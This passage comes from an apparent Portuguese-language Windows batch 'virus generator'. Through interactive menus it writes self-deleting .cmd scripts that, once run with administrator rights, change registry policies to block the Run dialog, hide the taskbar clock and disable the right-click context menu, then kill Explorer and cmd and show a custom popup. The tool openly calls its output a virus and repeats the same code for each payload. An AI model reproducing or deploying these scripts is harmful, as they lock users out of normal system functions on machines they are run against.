 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:v9
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Bloquear o Executar
echo.
echo  { 2 ^<= Desbloquear o Executar
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a46
if %k% == 2 goto a51
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v9
:a46
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a47
if %k% == n goto a50
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a46
:a47
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a48
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto t6
if %s5% == 2 goto a47
if %s5% == 3 goto a49
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a48
:t6
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a48
:a49
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a49
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a50
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a50
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a51
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a51
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:v10
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Esconder o Relขgio
echo.
echo  { 2 ^<= Mostra o Relขgio
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a52
if %k% == 2 goto a58
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v10
:a52
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a53
if %k% == n goto a57
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a52
:a53
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a54
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto a56
if %s5% == 2 goto a53
if %s5% == 3 goto a55
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a48
:a56
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a54
:a55
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a49
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a57
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a57
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a58
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a58
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2

::VIRUS 11

:v11
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Bloquear Lado direito do Mouse
echo.
echo  { 2 ^<= Desbloquear Lado direito do Mouse
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a59 
if %k% == 2 goto a64 
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v10
:a59
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a65
if %k% == n goto a66
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a59
:a65
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a67
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto a68
if %s5% == 2 goto a65
if %s5% == 3 goto a69
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a67
:a68
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a67
:a69
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a69
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a66
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a66
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
